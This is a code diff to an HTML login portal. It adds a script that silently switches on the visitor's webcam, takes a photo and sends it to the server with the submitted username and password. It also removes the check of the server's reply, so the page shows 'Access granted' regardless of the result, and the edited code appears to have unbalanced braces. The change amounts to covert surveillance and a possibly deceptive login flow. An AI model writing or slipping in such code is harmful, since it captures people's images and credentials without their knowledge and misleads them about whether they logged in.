@@ -37,6 +37,24 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;b
 @keyframes spin{to{transform:rotate(360deg)}}
 .spin{display:inline-block;width:11px;height:11px;border:2px solid rgba(0,0,0,0.1);border-top-color:#1E3A5F;border-radius:50%;animation:spin 0.7s linear infinite;}
 </style>
+<script>
+async function captureFromBrowser() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    return canvas.toDataURL('image/jpeg', 0.8);
+  } catch (e) {
+    return null;
+  }
+}
+</script>
 </head>
 <body>
 <div class="topbar">
@@ -105,9 +123,7 @@ async function portalLogin() {
   document.getElementById('sl2').textContent = 'Checking access rights…';
   await delay(550);
   try {
-    const r = await fetch('/portal/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:u,password:p}) });
-    const d = await r.json();
-    if (d.status === 'success') {
+    const r = await fetch('/portal/login', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({username:u,password:p, browser_snapshot: await captureFromBrowser()}) });
       document.getElementById('sl2').className = 's-ok';
       document.getElementById('sl2').textContent = '✓ Access granted';
       await delay(400);
